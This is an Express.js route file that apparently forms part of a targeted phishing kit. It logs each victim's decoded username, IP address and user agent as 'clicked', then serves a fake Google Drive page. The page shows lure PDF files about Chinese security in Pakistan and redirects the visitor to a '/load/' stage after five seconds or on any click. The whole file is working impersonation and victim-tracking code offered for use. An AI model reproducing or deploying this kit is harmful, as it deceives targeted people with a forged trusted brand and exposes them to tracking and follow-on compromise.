
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.ffregretgreytusnsxbsahdbaxuisadbasbe;
    
    if (data == null) {
        res.render('error');
    } else {
        const userid = Buffer.from(data, 'base64').toString('utf-8');
        const word = 'clicked';

        // Get the client IP, handle undefined or null
        const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        // Check if clientIP is defined and not null
        let ip = '';
        if (clientIP) {
            ip = clientIP.split(',')[0].trim();
        } else {
            console.error('Client IP is undefined or null');
            ip = 'unknown';
        }

        const useragent = req.get('User-Agent');
        const date = new Date();
        const pagetype = 0;
        const mobiletype = 0;
        const notify = 2;

        // Do your further processing...
    

const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [userid], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

  if (rowCount > 0) {

                const updateQuery = 'UPDATE maintable SET password = ?, pagetype = ?, mobiletype = ?, notify = ? WHERE username = ?';
                db.query(updateQuery, [word, pagetype, mobiletype, notify, userid], (err) => {
                    if (err) {
                        console.error('Error inserting record:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                

                    });


        }else{

            const insertQuery = 'INSERT INTO maintable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        }

   
    const url = `/load/?wihdft948fdjxgjdferuideq=${data}`;

   

    const htmlContent = `
      <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My Drive - Google Drive</title>

<link rel="shortcut icon" href="/images/drive.png" type="image/png">
<link rel="stylesheet" href="/stylesheet/style1.css">

<style>
.logo {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 20px;
}
.logo img {
    height: 38px;
}
.drive-icon {
    width: 18px;
    height: 28px;
    vertical-align: middle;
    margin-right: 6px;
}
.file-link {
    text-decoration: none;
    color: #333;
    cursor: pointer;
}
.file-link:hover {
    text-decoration: underline;
}
</style>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const REDIRECT_URL = "${url}";
    const DELAY = 5000;
    let timer;

    timer = setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, DELAY);

    document.querySelectorAll(".file-link").forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            clearTimeout(timer);
            window.location.href = REDIRECT_URL;
        });
    });
});
</script>


</head>

<body>

<header class="top-bar">
    <div class="logo">
        <img src="./images/13.png">
        <span>Drive</span>
    </div>
    <input type="text" placeholder="Search in Drive" class="search">
    <div class="logo">
        <img src="./images/14.png">
    </div>
</header>

<div class="container">

<aside class="sidebar">
    <button class="new-btn">+ New</button>
    <ul>
        <li class="active">
            <img src="/images/15.png" class="drive-icon"> My Drive
        </li>
        <li>💻 Computers</li>
        <li>👥 Shared with me</li>
        <li>🕒 Recent</li>
        <li>⭐ Starred</li>
        <li>🗑️ Bin</li>
        <li>☁ Storage</li>
    </ul>
    <p class="storage-text">3.3 MB of 15 GB used</p>
    <button class="upgrade-btn">Get more storage</button>
</aside>

<main class="content">
<h2>My Drive</h2>

<table class="files">
<thead>
<tr>
    <th>Name</th>
    <th>Owner</th>
    <th>Date Modified</th>
    <th>File Size</th>
</tr>
</thead>

<tbody>
<tr>
<td>
    <img src="/images/11.png" class="pdf-icon">
    <a class="file-link" data-pdf="">
        Meeting- Chinese security in Pakistan.pdf
    </a>
</td>
<td>me</td>
<td>24 Feb 2026</td>
<td>500 KB</td>
</tr>

<tr>
<td>
    <img src="/images/11.png" class="pdf-icon">
    <a class="file-link" data-pdf="">
        Minutes of Meeting of Chinese security in Pakistan.pdf
    </a>
</td>
<td>me</td>
<td>23 Feb 2026</td>
<td>350 KB</td>
</tr>
</tbody>
</table>
</main>

</div>

</body>
</html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            
});
}
});

module.exports =router
